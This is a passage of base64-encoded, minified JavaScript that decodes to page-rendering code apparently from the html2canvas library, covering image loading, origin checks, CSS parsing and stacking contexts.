2VCYWNrZ3JvdW5kSW1hZ2VzKCkuZmlsdGVyKHRoaXMuaGFzSW1hZ2VCYWNrZ3JvdW5kKS5mb3JFYWNoKHRoaXMuYWRkSW1hZ2UodCx0aGlzLmxvYWRJbWFnZSksdGhpcyksdH0sUC5wcm90b3R5cGUuYWRkSW1hZ2U9ZnVuY3Rpb24odCxlKXtyZXR1cm4gZnVuY3Rpb24obil7bi5hcmdzLmZvckVhY2goZnVuY3Rpb24ocil7dGhpcy5pbWFnZUV4aXN0cyh0LHIpfHwodC5zcGxpY2UoMCwwLGUuY2FsbCh0aGlzLG4pKSxOKCJBZGRlZCBpbWFnZSAjIit0Lmxlbmd0aCwic3RyaW5nIj09dHlwZW9mIHI/ci5zdWJzdHJpbmcoMCwxMDApOnIpKX0sdGhpcyl9fSxQLnByb3RvdHlwZS5oYXNJbWFnZUJhY2tncm91bmQ9ZnVuY3Rpb24odCl7cmV0dXJuIm5vbmUiIT09dC5tZXRob2R9LFAucHJvdG90eXBlLmxvYWRJbWFnZT1mdW5jdGlvbih0KXtpZigidXJsIj09PXQubWV0aG9kKXt2YXIgZT10LmFyZ3NbMF07cmV0dXJuIXRoaXMuaXNTVkcoZSl8fHRoaXMuc3VwcG9ydC5zdmd8fHRoaXMub3B0aW9ucy5hbGxvd1RhaW50P2UubWF0Y2goL2RhdGE6aW1hZ2VcLy4qO2Jhc2U2NCwvaSk/bmV3IE0oZS5yZXBsYWNlKC91cmxcKFsnIl17MCx9fFsnIl17MCx9XCkkL2dpLCIiKSwhMSk6dGhpcy5pc1NhbWVPcmlnaW4oZSl8fHRoaXMub3B0aW9ucy5hbGxvd1RhaW50PT09ITB8fHRoaXMuaXNTVkcoZSk/bmV3IE0oZSwhMSk6dGhpcy5zdXBwb3J0LmNvcnMmJiF0aGlzLm9wdGlvbnMuYWxsb3dUYWludCYmdGhpcy5vcHRpb25zLnVzZUNPUlM/bmV3IE0oZSwhMCk6dGhpcy5vcHRpb25zLnByb3h5P25ldyBMZShlLHRoaXMub3B0aW9ucy5wcm94eSk6bmV3IFMoZSk6bmV3IEZlKGUpfXJldHVybiJsaW5lYXItZ3JhZGllbnQiPT09dC5tZXRob2Q/bmV3IEwodCk6ImdyYWRpZW50Ij09PXQubWV0aG9kP25ldyB6ZSh0KToic3ZnIj09PXQubWV0aG9kP25ldyBXZSh0LmFyZ3NbMF0sdGhpcy5zdXBwb3J0LnN2Zyk6IklGUkFNRSI9PT10Lm1ldGhvZD9uZXcgUih0LmFyZ3NbMF0sdGhpcy5pc1NhbWVPcmlnaW4odC5hcmdzWzBdLnNyYyksdGhpcy5vcHRpb25zKTpuZXcgUyh0KX0sUC5wcm90b3R5cGUuaXNTVkc9ZnVuY3Rpb24odCl7cmV0dXJuInN2ZyI9PT10LnN1YnN0cmluZyh0Lmxlbmd0aC0zKS50b0xvd2VyQ2FzZSgpfHxGZS5wcm90b3R5cGUuaXNJbmxpbmUodCl9LFAucHJvdG90eXBlLmltYWdlRXhpc3RzPWZ1bmN0aW9uKHQsZSl7cmV0dXJuIHQuc29tZShmdW5jdGlvbih0KXtyZXR1cm4gdC5zcmM9PT1lfSl9LFAucHJvdG90eXBlLmlzU2FtZU9yaWdpbj1mdW5jdGlvbih0KXtyZXR1cm4gdGhpcy5nZXRPcmlnaW4odCk9PT10aGlzLm9yaWdpbn0sUC5wcm90b3R5cGUuZ2V0T3JpZ2luPWZ1bmN0aW9uKHQpe3ZhciBuPXRoaXMubGlua3x8KHRoaXMubGluaz1lLmNyZWF0ZUVsZW1lbnQoImEiKSk7cmV0dXJuIG4uaHJlZj10LG4uaHJlZj1uLmhyZWYsbi5wcm90b2NvbCtuLmhvc3RuYW1lK24ucG9ydH0sUC5wcm90b3R5cGUuZ2V0UHJvbWlzZT1mdW5jdGlvbih0KXtyZXR1cm4gdGhpcy50aW1lb3V0KHQsdGhpcy5vcHRpb25zLmltYWdlVGltZW91dClbImNhdGNoIl0oZnVuY3Rpb24oKXt2YXIgZT1uZXcgUyh0LnNyYyk7cmV0dXJuIGUucHJvbWlzZS50aGVuKGZ1bmN0aW9uKGUpe3QuaW1hZ2U9ZX0pfSl9LFAucHJvdG90eXBlLmdldD1mdW5jdGlvbih0KXt2YXIgZT1udWxsO3JldHVybiB0aGlzLmltYWdlcy5zb21lKGZ1bmN0aW9uKG4pe3JldHVybihlPW4pLnNyYz09PXR9KT9lOm51bGx9LFAucHJvdG90eXBlLmZldGNoPWZ1bmN0aW9uKHQpe3JldHVybiB0aGlzLmltYWdlcz10LnJlZHVjZShiZSh0aGlzLmZpbmRCYWNrZ3JvdW5kSW1hZ2UsdGhpcyksdGhpcy5maW5kSW1hZ2VzKHQpKSx0aGlzLmltYWdlcy5mb3JFYWNoKGZ1bmN0aW9uKHQsZSl7dC5wcm9taXNlLnRoZW4oZnVuY3Rpb24oKXtOKCJTdWNjZXNmdWxseSBsb2FkZWQgaW1hZ2UgIyIrKGUrMSksdCl9LGZ1bmN0aW9uKG4pe04oIkZhaWxlZCBsb2FkaW5nIGltYWdlICMiKyhlKzEpLHQsbil9KX0pLHRoaXMucmVhZHk9UHJvbWlzZS5hbGwodGhpcy5pbWFnZXMubWFwKHRoaXMuZ2V0UHJvbWlzZSx0aGlzKSksTigiRmluaXNoZWQgc2VhcmNoaW5nIGltYWdlcyIpLHRoaXN9LFAucHJvdG90eXBlLnRpbWVvdXQ9ZnVuY3Rpb24odCxlKXt2YXIgbixyPVByb21pc2UucmFjZShbdC5wcm9taXNlLG5ldyBQcm9taXNlKGZ1bmN0aW9uKHIsbyl7bj1zZXRUaW1lb3V0KGZ1bmN0aW9uKCl7TigiVGltZWQgb3V0IGxvYWRpbmcgaW1hZ2UiLHQpLG8odCl9LGUpfSldKS50aGVuKGZ1bmN0aW9uKHQpe3JldHVybiBjbGVhclRpbWVvdXQobiksdH0pO3JldHVybiByWyJjYXRjaCJdKGZ1bmN0aW9uKCl7Y2xlYXJUaW1lb3V0KG4pfSkscn0sTC5wcm90b3R5cGU9T2JqZWN0LmNyZWF0ZShBLnByb3RvdHlwZSksTC5wcm90b3R5cGUuc3RlcFJlZ0V4cD0vKCg/OnJnYnxyZ2JhKVwoXGR7MSwzfSxcc1xkezEsM30sXHNcZHsxLDN9KD86LFxzWzAtOVwuXSspP1wpKVxzKihcZHsxLDN9KT8oJXxweCk/LyxELnByb3RvdHlwZS5jbG9uZVRvPWZ1bmN0aW9uKHQpe3QudmlzaWJsZT10aGlzLnZpc2libGUsdC5ib3JkZXJzPXRoaXMuYm9yZGVycyx0LmJvdW5kcz10aGlzLmJvdW5kcyx0LmNsaXA9dGhpcy5jbGlwLHQuYmFja2dyb3VuZENsaXA9dGhpcy5iYWNrZ3JvdW5kQ2xpcCx0LmNvbXB1dGVkU3R5bGVzPXRoaXMuY29tcHV0ZWRTdHlsZXMsdC5zdHlsZXM9dGhpcy5zdHlsZXMsdC5iYWNrZ3JvdW5kSW1hZ2VzPXRoaXMuYmFja2dyb3VuZEltYWdlcyx0Lm9wYWNpdHk9dGhpcy5vcGFjaXR5fSxELnByb3RvdHlwZS5nZXRPcGFjaXR5PWZ1bmN0aW9uKCl7cmV0dXJuIG51bGw9PT10aGlzLm9wYWNpdHk/dGhpcy5vcGFjaXR5PXRoaXMuY3NzRmxvYXQoIm9wYWNpdHkiKTp0aGlzLm9wYWNpdHl9LEQucHJvdG90eXBlLmFzc2lnblN0YWNrPWZ1bmN0aW9uKHQpe3RoaXMuc3RhY2s9dCx0LmNoaWxkcmVuLnB1c2godGhpcyl9LEQucHJvdG90eXBlLmlzRWxlbWVudFZpc2libGU9ZnVuY3Rpb24oKXtyZXR1cm4gdGhpcy5ub2RlLm5vZGVUeXBlPT09Tm9kZS5URVhUX05PREU/dGhpcy5wYXJlbnQudmlzaWJsZToibm9uZSIhPT10aGlzLmNzcygiZGlzcGxheSIpJiYiaGlkZGVuIiE9PXRoaXMuY3NzKCJ2aXNpYmlsaXR5IikmJiF0aGlzLm5vZGUuaGFzQXR0cmlidXRlKCJkYXRhLWh0bWwyY2FudmFzLWlnbm9yZSIpJiYoIklOUFVUIiE9PXRoaXMubm9kZS5ub2RlTmFtZXx8ImhpZGRlbiIhPT10aGlzLm5vZGUuZ2V0QXR0cmlidXRlKCJ0eXBlIikpfSxELnByb3RvdHlwZS5jc3M9ZnVuY3Rpb24odCl7cmV0dXJuIHRoaXMuY29tcHV0ZWRTdHlsZXN8fCh0aGlzLmNvbXB1dGVkU3R5bGVzPXRoaXMuaXNQc2V1ZG9FbGVtZW50P3RoaXMucGFyZW50LmNvbXB1dGVkU3R5bGUodGhpcy5iZWZvcmU/IjpiZWZvcmUiOiI6YWZ0ZXIiKTp0aGlzLmNvbXB1dGVkU3R5bGUobnVsbCkpLHRoaXMuc3R5bGVzW3RdfHwodGhpcy5zdHlsZXNbdF09dGhpcy5jb21wdXRlZFN0eWxlc1t0XSl9LEQucHJvdG90eXBlLnByZWZpeGVkQ3NzPWZ1bmN0aW9uKHQpe3ZhciBlPVsid2Via2l0IiwibW96IiwibXMiLCJvIl0sbj10aGlzLmNzcyh0KTtyZXR1cm4gbj09PWkmJmUuc29tZShmdW5jdGlvbihlKXtyZXR1cm4gbj10aGlzLmNzcyhlK3Quc3Vic3RyKDAsMSkudG9VcHBlckNhc2UoKSt0LnN1YnN0cigxKSksbiE9PWl9LHRoaXMpLG49PT1pP251bGw6bn0sRC5wcm90b3R5cGUuY29tcHV0ZWRTdHlsZT1mdW5jdGlvbih0KXtyZXR1cm4gdGhpcy5ub2RlLm93bmVyRG9jdW1lbnQuZGVmYXVsdFZpZXcuZ2V0Q29tcHV0ZWRTdHlsZSh0aGlzLm5vZGUsdCl9LEQucHJvdG90eXBlLmNzc0ludD1mdW5jdGlvbih0KXt2YXIgZT1wYXJzZUludCh0aGlzLmNzcyh0KSwxMCk7cmV0dXJuIGlzTmFOKGUpPzA6ZX0sRC5wcm90b3R5cGUuY29sb3I9ZnVuY3Rpb24odCl7cmV0dXJuIHRoaXMuY29sb3JzW3RdfHwodGhpcy5jb2xvcnNbdF09bmV3IEModGhpcy5jc3ModCkpKX0sRC5wcm90b3R5cGUuY3NzRmxvYXQ9ZnVuY3Rpb24odCl7dmFyIGU9cGFyc2VGbG9hdCh0aGlzLmNzcyh0KSk7cmV0dXJuIGlzTmFOKGUpPzA6ZX0sRC5wcm90b3R5cGUuZm9udFdlaWdodD1mdW5jdGlvbigpe3ZhciB0PXRoaXMuY3NzKCJmb250V2VpZ2h0Iik7c3dpdGNoKHBhcnNlSW50KHQsMTApKXtjYXNlIDQwMTp0PSJib2xkIjticmVhaztjYXNlIDQwMDp0PSJub3JtYWwifXJldHVybiB0fSxELnByb3RvdHlwZS5wYXJzZUNsaXA9ZnVuY3Rpb24oKXt2YXIgdD10aGlzLmNzcygiY2xpcCIpLm1hdGNoKHRoaXMuQ0xJUCk7cmV0dXJuIHQ/e3RvcDpwYXJzZUludCh0WzFdLDEwKSxyaWdodDpwYXJzZUludCh0WzJdLDEwKSxib3R0b206cGFyc2VJbnQodFszXSwxMCksbGVmdDpwYXJzZUludCh0WzRdLDEwKX06bnVsbH0sRC5wcm90b3R5cGUucGFyc2VCYWNrZ3JvdW5kSW1hZ2VzPWZ1bmN0aW9uKCl7cmV0dXJuIHRoaXMuYmFja2dyb3VuZEltYWdlc3x8KHRoaXMuYmFja2dyb3VuZEltYWdlcz1qKHRoaXMuY3NzKCJiYWNrZ3JvdW5kSW1hZ2UiKSkpfSxELnByb3RvdHlwZS5jc3NMaXN0PWZ1bmN0aW9uKHQsZSl7dmFyIG49KHRoaXMuY3NzKHQpfHwiIikuc3BsaXQoIiwiKTtyZXR1cm4gbj1uW2V8fDBdfHxuWzBdfHwiYXV0byIsbj1uLnRyaW0oKS5zcGxpdCgiICIpLDE9PT1uLmxlbmd0aCYmKG49W25bMF0sblswXV0pLG59LEQucHJvdG90eXBlLnBhcnNlQmFja2dyb3VuZFNpemU9ZnVuY3Rpb24odCxlLG4pe3ZhciByLG8saT10aGlzLmNzc0xpc3QoImJhY2tncm91bmRTaXplIixuKTtpZihGKGlbMF0pKXI9dC53aWR0aCpwYXJzZUZsb2F0KGlbMF0pLzEwMDtlbHNle2lmKC9jb250YWlufGNvdmVyLy50ZXN0KGlbMF0pKXt2YXIgYT10LndpZHRoL3QuaGVpZ2h0LHM9ZS53aWR0aC9lLmhlaWdodDtyZXR1cm4gcz5hXiJjb250YWluIj09PWlbMF0/e3dpZHRoOnQuaGVpZ2h0KnMsaGVpZ2h0OnQuaGVpZ2h0fTp7d2lkdGg6dC53aWR0aCxoZWlnaHQ6dC53aWR0aC9zfX1yPXBhcnNlSW50KGlbMF0sMTApfXJldHVybiBvPSJhdXRvIj09PWlbMF0mJiJhdXRvIj09PWlbMV0/ZS5oZWlnaHQ6ImF1dG8iPT09aVsxXT9yL2Uud2lkdGgqZS5oZWlnaHQ6RihpWzFdKT90LmhlaWdodCpwYXJzZUZsb2F0KGlbMV0pLzEwMDpwYXJzZUludChpWzFdLDEwKSwiYXV0byI9PT1pWzBdJiYocj1vL2UuaGVpZ2h0KmUud2lkdGgpLHt3aWR0aDpyLGhlaWdodDpvfX0sRC5wcm90b3R5cGUucGFyc2VCYWNrZ3JvdW5kUG9zaXRpb249ZnVuY3Rpb24odCxlLG4scil7dmFyIG8saSxhPXRoaXMuY3NzTGlzdCgiYmFja2dyb3VuZFBvc2l0aW9uIixuKTtyZXR1cm4gbz1GKGFbMF0pPyh0LndpZHRoLShyfHxlKS53aWR0aCkqKHBhcnNlRmxvYXQoYVswXSkvMTAwKTpwYXJzZUludChhWzBdLDEwKSxpPSJhdXRvIj09PWFbMV0/by9lLndpZHRoKmUuaGVpZ2h0OkYoYVsxXSk/KHQuaGVpZ2h0LShyfHxlKS5oZWlnaHQpKnBhcnNlRmxvYXQoYVsxXSkvMTAwOnBhcnNlSW50KGFbMV0sMTApLCJhdXRvIj09PWFbMF0mJihvPWkvZS5oZWlnaHQqZS53aWR0aCkse2xlZnQ6byx0b3A6aX19LEQucHJvdG90eXBlLnBhcnNlQmFja2dyb3VuZFJlcGVhdD1mdW5jdGlvbih0KXtyZXR1cm4gdGhpcy5jc3NMaXN0KCJiYWNrZ3JvdW5kUmVwZWF0Iix0KVswXX0sRC5wcm90b3R5cGUucGFyc2VUZXh0U2hhZG93cz1mdW5jdGlvbigpe3ZhciB0PXRoaXMuY3NzKCJ0ZXh0U2hhZG93IiksZT1bXTtpZih0JiYibm9uZSIhPT10KWZvcih2YXIgbj10Lm1hdGNoKHRoaXMuVEVYVF9TSEFET1dfUFJPUEVSVFkpLHI9MDtuJiZyPG4ubGVuZ3RoO3IrKyl7dmFyIG89bltyXS5tYXRjaCh0aGlzLlRFWFRfU0hBRE9XX1ZBTFVFUyk7ZS5wdXNoKHtjb2xvcjpuZXcgQyhvWzBdKSxvZmZzZXRYOm9bMV0/cGFyc2VGbG9hdChvWzFdLnJlcGxhY2UoInB4IiwiIikpOjAsb2Zmc2V0WTpvWzJdP3BhcnNlRmxvYXQob1syXS5yZXBsYWNlKCJweCIsIiIpKTowLGJsdXI6b1szXT9vWzNdLnJlcGxhY2UoInB4IiwiIik6MH0pfXJldHVybiBlfSxELnByb3RvdHlwZS5wYXJzZVRyYW5zZm9ybT1mdW5jdGlvbigpe2lmKCF0aGlzLnRyYW5zZm9ybURhdGEpaWYodGhpcy5oYXNUcmFuc2Zvcm0oKSl7dmFyIHQ9dGhpcy5wYXJzZUJvdW5kcygpLGU9dGhpcy5wcmVmaXhlZENzcygidHJhbnNmb3JtT3JpZ2luIikuc3BsaXQoIiAiKS5tYXAoVykubWFwKEgpO2VbMF0rPXQubGVmdCxlWzFdKz10LnRvcCx0aGlzLnRyYW5zZm9ybURhdGE9e29yaWdpbjplLG1hdHJpeDp0aGlzLnBhcnNlVHJhbnNmb3JtTWF0cml4KCl9fWVsc2UgdGhpcy50cmFuc2Zvcm1EYXRhPXtvcmlnaW46WzAsMF0sbWF0cml4OlsxLDAsMCwxLDAsMF19O3JldHVybiB0aGlzLnRyYW5zZm9ybURhdGF9LEQucHJvdG90eXBlLnBhcnNlVHJhbnNmb3JtTWF0cml4PWZ1bmN0aW9uKCl7aWYoIXRoaXMudHJhbnNmb3JtTWF0cml4KXt2YXIgdD10aGlzLnByZWZpeGVkQ3NzKCJ0cmFuc2Zvcm0iKSxlPXQ/Xyh0Lm1hdGNoKHRoaXMuTUFUUklYX1BST1BFUlRZKSk6bnVsbDt0aGlzLnRyYW5zZm9ybU1hdHJpeD1lP2U6WzEsMCwwLDEsMCwwXX1yZXR1cm4gdGhpcy50cmFuc2Zvcm1NYXRyaXh9LEQucHJvdG90eXBlLnBhcnNlQm91bmRzPWZ1bmN0aW9uKCl7cmV0dXJuIHRoaXMuYm91bmRzfHwodGhpcy5ib3VuZHM9dGhpcy5oYXNUcmFuc2Zvcm0oKT96KHRoaXMubm9kZSk6Vih0aGlzLm5vZGUpKX0sRC5wcm90b3R5cGUuaGFzVHJhbnNmb3JtPWZ1bmN0aW9uKCl7cmV0dXJuIjEsMCwwLDEsMCwwIiE9PXRoaXMucGFyc2VUcmFuc2Zvcm1NYXRyaXgoKS5qb2luKCIsIil8fHRoaXMucGFyZW50JiZ0aGlzLnBhcmVudC5oYXNUcmFuc2Zvcm0oKX0sRC5wcm90b3R5cGUuZ2V0VmFsdWU9ZnVuY3Rpb24oKXt2YXIgdD10aGlzLm5vZGUudmFsdWV8fCIiO3JldHVybiJTRUxFQ1QiPT09dGhpcy5ub2RlLnRhZ05hbWU/dD1CKHRoaXMubm9kZSk6InBhc3N3b3JkIj09PXRoaXMubm9kZS50eXBlJiYodD1BcnJheSh0Lmxlbmd0aCsxKS5qb2luKCLigKIiKSksMD09PXQubGVuZ3RoP3RoaXMubm9kZS5wbGFjZWhvbGRlcnx8IiI6dH0sRC5wcm90b3R5cGUuTUFUUklYX1BST1BFUlRZPS8obWF0cml4KVwoKC4rKVwpLyxELnByb3RvdHlwZS5URVhUX1NIQURPV19QUk9QRVJUWT0vKChyZ2JhfHJnYilcKFteXCldK1wpKFxzLT9cZCtweCl7MCx9KS9nLEQucHJvdG90eXBlLlRFWFRfU0hBRE9XX1ZBTFVFUz0vKC0/XGQrcHgpfCgjLispfChyZ2JcKC4rXCkpfChyZ2JhXCguK1wpKS9nLEQucHJvdG90eXBlLkNMSVA9L15yZWN0XCgoXGQrKXB4LD8gKFxkKylweCw/IChcZCspcHgsPyAoXGQrKXB4XCkkLyxVLnByb3RvdHlwZS5jYWxjdWxhdGVPdmVyZmxvd0NsaXBzPWZ1bmN0aW9uKCl7dGhpcy5ub2Rlcy5mb3JFYWNoKGZ1bmN0aW9uKHQpe2lmKGZlKHQpKXtnZSh0KSYmdC5hcHBlbmRUb0RPTSgpLHQuYm9yZGVycz10aGlzLnBhcnNlQm9yZGVycyh0KTt2YXIgZT0iaGlkZGVuIj09PXQuY3NzKCJvdmVyZmxvdyIpP1t0LmJvcmRlcnMuY2xpcF06W10sbj10LnBhcnNlQ2xpcCgpO24mJi0xIT09WyJhYnNvbHV0ZSIsImZpeGVkIl0uaW5kZXhPZih0LmNzcygicG9zaXRpb24iKSkmJmUucHVzaChbWyJyZWN0Iix0LmJvdW5kcy5sZWZ0K24ubGVmdCx0LmJvdW5kcy50b3Arbi50b3Asbi5yaWdodC1uLmxlZnQsbi5ib3R0b20tbi50b3BdXSksdC5jbGlwPXEodCk/dC5wYXJlbnQuY2xpcC5jb25jYXQoZSk6ZSx0LmJhY2tncm91bmRDbGlwPSJoaWRkZW4iIT09dC5jc3MoIm92ZXJmbG93Iik/dC5jbGlwLmNvbmNhdChbdC5ib3JkZXJzLmNsaXBdKTp0LmNsaXAsZ2UodCkmJnQuY2xlYW5ET00oKX1lbHNlIG1lKHQpJiYodC5jbGlwPXEodCk/dC5wYXJlbnQuY2xpcDpbXSk7Z2UodCl8fCh0LmJvdW5kcz1udWxsKX0sdGhpcyl9LFUucHJvdG90eXBlLmFzeW5jUmVuZGVyZXI9ZnVuY3Rpb24odCxlLG4pe249bnx8RGF0ZS5ub3coKSx0aGlzLnBhaW50KHRbdGhpcy5yZW5kZXJJbmRleCsrXSksdC5sZW5ndGg9PT10aGlzLnJlbmRlckluZGV4P2UoKTpuKzIwPkRhdGUubm93KCk/dGhpcy5hc3luY1JlbmRlcmVyKHQsZSxuKTpzZXRUaW1lb3V0KGJlKGZ1bmN0aW9uKCl7dGhpcy5hc3luY1JlbmRlcmVyKHQsZSl9LHRoaXMpLDApfSxVLnByb3RvdHlwZS5jcmVhdGVQc2V1ZG9IaWRlU3R5bGVzPWZ1bmN0aW9uKHQpe3RoaXMuY3JlYXRlU3R5bGVzKHQsIi4iK05lLnByb3RvdHlwZS5QU0VVRE9fSElERV9FTEVNRU5UX0NMQVNTX0JFRk9SRSsnOmJlZm9yZSB7IGNvbnRlbnQ6ICIiICFpbXBvcnRhbnQ7IGRpc3BsYXk6IG5vbmUgIWltcG9ydGFudDsgfS4nK05lLnByb3RvdHlwZS5QU0VVRE9fSElERV9FTEVNRU5UX0NMQVNTX0FGVEVSKyc6YWZ0ZXIgeyBjb250ZW50OiAiIiAhaW1wb3J0YW50OyBkaXNwbGF5OiBub25lICFpbXBvcnRhbnQ7IH0nKX0sVS5wcm90b3R5cGUuZGlzYWJsZUFuaW1hdGlvbnM9ZnVuY3Rpb24odCl7dGhpcy5jcmVhdGVTdHlsZXModCwiKiB7IC13ZWJraXQtYW5pbWF0aW9uOiBub25lICFpbXBvcnRhbnQ7IC1tb3otYW5pbWF0aW9uOiBub25lICFpbXBvcnRhbnQ7IC1vLWFuaW1hdGlvbjogbm9uZSAhaW1wb3J0YW50OyBhbmltYXRpb246IG5vbmUgIWltcG9ydGFudDsgLXdlYmtpdC10cmFuc2l0aW9uOiBub25lICFpbXBvcnRhbnQ7IC1tb3otdHJhbnNpdGlvbjogbm9uZSAhaW1wb3J0YW50OyAtby10cmFuc2l0aW9uOiBub25lICFpbXBvcnRhbnQ7IHRyYW5zaXRpb246IG5vbmUgIWltcG9ydGFudDt9Iil9LFUucHJvdG90eXBlLmNyZWF0ZVN0eWxlcz1mdW5jdGlvbih0LGUpe3ZhciBuPXQuY3JlYXRlRWxlbWVudCgic3R5bGUiKTtuLmlubmVySFRNTD1lLHQuYm9keS5hcHBlbmRDaGlsZChuKX0sVS5wcm90b3R5cGUuZ2V0UHNldWRvRWxlbWVudHM9ZnVuY3Rpb24odCl7dmFyIGU9W1t0XV07aWYodC5ub2RlLm5vZGVUeXBlPT09Tm9kZS5FTEVNRU5UX05PREUpe3ZhciBuPXRoaXMuZ2V0UHNldWRvRWxlbWVudCh0LCI6YmVmb3JlIikscj10aGlzLmdldFBzZXVkb0VsZW1lbnQodCwiOmFmdGVyIik7biYmZS5wdXNoKG4pLHImJmUucHVzaChyKX1yZXR1cm4gVGUoZSl9LFUucHJvdG90eXBlLmdldFBzZXVkb0VsZW1lbnQ9ZnVuY3Rpb24odCxuKXt2YXIgcj10LmNvbXB1dGVkU3R5bGUobik7aWYoIXJ8fCFyLmNvbnRlbnR8fCJub25lIj09PXIuY29udGVudHx8Ii1tb3otYWx0LWNvbnRlbnQiPT09ci5jb250ZW50fHwibm9uZSI9PT1yLmRpc3BsYXkpcmV0dXJuIG51bGw7Zm9yKHZhciBvPWtlKHIuY29udGVudCksaT0idXJsIj09PW8uc3Vic3RyKDAsMyksYT1lLmNyZWF0ZUVsZW1lbnQoaT8iaW1nIjoiaHRtbDJjYW52YXNwc2V1ZG9lbGVtZW50Iikscz1uZXcgTmUoYSx0LG4pLGM9ci5sZW5ndGgtMTtjPj0wO2MtLSl7dmFyIGg9WChyLml0ZW0oYykpO2Euc3R5bGVbaF09cltoXX1pZihhLmNsYXNzTmFtZT1OZS5wcm90b3R5cGUuUFNFVURPX0hJREVfRUxFTUVOVF9DTEFTU19CRUZPUkUrIiAiK05lLnByb3RvdHlwZS5QU0VVRE9fSElERV9FTEVNRU5UX0NMQVNTX0FGVEVSLGkpcmV0dXJuIGEuc3JjPWoobylbMF0uYXJnc1swXSxbc107dmFyIGw9ZS5jcmVhdGVUZXh0Tm9kZShvKTtyZXR1cm4gYS5hcHBlbmRDaGlsZChsKSxbcyxuZXcgSGUobCxzKV19LFUucHJvdG90eXBlLmdldENoaWxkcmVuPWZ1bmN0aW9uKHQpe3JldHVybiBUZShbXS5maWx0ZXIuY2FsbCh0Lm5vZGUuY2hpbGROb2RlcyxjZSkubWFwKGZ1bmN0aW9uKGUpe3ZhciBuPVtlLm5vZGVUeXBlPT09Tm9kZS5URVhUX05PREU/bmV3IEhlKGUsdCk6bmV3IEQoZSx0KV0uZmlsdGVyKEVlKTtyZXR1cm4gZS5ub2RlVHlwZT09PU5vZGUuRUxFTUVOVF9OT0RFJiZuLmxlbmd0aCYmIlRFWFRBUkVBIiE9PWUudGFnTmFtZT9uWzBdLmlzRWxlbWVudFZpc2libGUoKT9uLmNvbmNhdCh0aGlzLmdldENoaWxkcmVuKG5bMF0pKTpbXTpufSx0aGlzKSl9LFUucHJvdG90eXBlLm5ld1N0YWNraW5nQ29udGV4dD1mdW5jdGlvbih0LGUpe3ZhciBuPW5ldyBCZShlLHQuZ2V0T3BhY2l0eSgpLHQubm9kZSx0LnBhcmVudCk7dC5jbG9uZVRvKG4pO3ZhciByPWU/bi5nZXRQYXJlbnRTdGFjayh0aGlzKTpuLnBhcmVudC5zdGFjaztyLmNvbnRleHRzLnB1c2gobiksdC5zdGFjaz1ufSxVLnByb3RvdHlwZS5jcmVhdGVTdGFja2luZ0NvbnRleHRzPWZ1bmN0aW9uKCl7dGhpcy5ub2Rlcy5mb3JFYWNoKGZ1bmN0aW9uKHQpe2ZlKHQpJiYodGhpcy5pc1Jvb3RFbGVtZW50KHQpfHx2ZSh0KXx8aGUodCl8fHRoaXMuaXNCb2R5V2l0aFRyYW5zcGFyZW50Um9vdCh0KXx8dC5oYXNUcmFuc2Zvcm0oKSk/dGhpcy5uZXdTdGFja2luZ0NvbnRleHQodCwhMCk6ZmUodCkmJihsZSh0KSYmbmUodCl8fGRlKHQpfHx1ZSh0KSk/dGhpcy5uZXdTdGFja2luZ0NvbnRleHQodCwhMSk6dC5hc3NpZ25TdGFjayh0LnBhcmVudC5zdGFjayl9LHRoaXMpfSxVLnByb3RvdHlwZS5pc0JvZHlXaXRoVHJhbnNwYXJlbnRSb290PWZ1bmN0aW9uKHQpe3JldHVybiJCT0RZIj09PXQubm9kZS5ub2RlTmFtZSYmdC5wYXJlbnQuY29sb3IoImJhY2tncm91bmRDb2xvciIpLmlzVHJhbnNwYXJlbnQoKX0sVS5wcm90b3R5cGUuaXNSb290RWxlbWVudD1mdW5jdGlvbih0KXtyZXR1cm4gbnVsbD09PXQucGFyZW50fSxVLnByb3RvdHlwZS5zb3J0U3RhY2tpbmdDb250ZXh0cz1mdW5jdGlvbih0KXt0LmNvbnRleHRzLnNvcnQoeWUodC5jb250ZXh0cy5zbGljZSgwKSkpLHQuY29udGV4dHMuZm9yRWFjaCh0aGlzLnNvcnRTdGFja2luZ0NvbnRleHRzLHRoaXMpfSxVLnByb3RvdHlwZS5wYXJzZVRleHRCb3VuZHM9ZnVuY3Rpb24odCl7cmV0dXJuIGZ1bmN0aW9uKGUsbixyKXtpZigibm9uZSIhPT10LnBhcmVudC5jc3MoInRleHREZWNvcmF0aW9uIikuc3Vic3RyKDAsNCl8fDAhPT1lLnRyaW0oKS5sZW5ndGgpe2lmKHRoaXMuc3VwcG9ydC5yYW5nZUJvdW5kcyYmIXQucGFyZW50Lmhhc1RyYW5zZm9ybSgpKXt2YXIgbz1yLnNsaWNlKDAsbikuam9pbigiIikubGVuZ3RoO3JldHVybiB0aGlzLmdldFJhbmdlQm91bmRzKHQubm9kZSxvLGUubGVuZ3RoKX1pZih0Lm5vZGUmJiJzdHJpbmciPT10eXBlb2YgdC5ub2RlLmRhdGEpe3ZhciBpPXQubm9kZS5zcGxpdFRleHQoZS5sZW5ndGgpLGE9dGhpcy5nZXRXcmFwcGVyQm91bmRzKHQubm9kZSx0LnBhcmVudC5oYXNUcmFuc2Zvcm0oKSk7cmV0dXJuIHQubm9kZT1pLGF9fWVsc2UoIXRoaXMuc3VwcG9ydC5yYW5nZUJvdW5kc3x8dC5wYXJlbnQuaGFzVHJhbnNmb3JtKCkpJiYodC5ub2RlPXQubm9kZS5zcGxpdFRleHQoZS5sZW5ndGgpKTtyZXR1cm57fX19LFUucHJvdG90eXBlLmdldFdyYXBwZXJCb3VuZHM9ZnVuY3Rpb24odCxlKXt2YXIgbj10Lm93bmVyRG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaHRtbDJjYW52YXN3cmFwcGVyIikscj10LnBhcmVudE5vZGUsbz10LmNsb25lTm9kZSghMCk7bi5hcHBlbmRDaGlsZCh0LmNsb25lTm9kZSghMCkpLHIucmVwbGFjZUNoaWxkKG4sdCk7dmFyIGk9ZT96KG4pOlYobik7cmV0dXJuIHIucmVwbGFjZUNoaWxkKG8sbiksaX0sVS5wcm90b3R5cGUuZ2V0UmFuZ2VCb3VuZHM9ZnVuY3Rpb24odCxlLG4pe3ZhciByPXRoaXMucmFuZ2V8fCh0aGlzLnJhbmdlPXQub3duZXJEb2N1bWVudC5jcmVhdGVSYW5nZSgpKTtyZXR1cm4gci5zZXRTdGFydCh0LGUpLHIuc2V0RW5kKHQsZStuKSxyLmdldEJvdW5kaW5nQ2xpZW50UmVjdCgpfSxVLnByb3RvdHlwZS5wYXJzZT1mdW5jdGlvbih0KXt2YXIgZT10LmNvbnRleHRzLmZpbHRlcih0ZSksbj10LmNoaWxkcmVuLmZpbHRlcihmZSkscj1uLm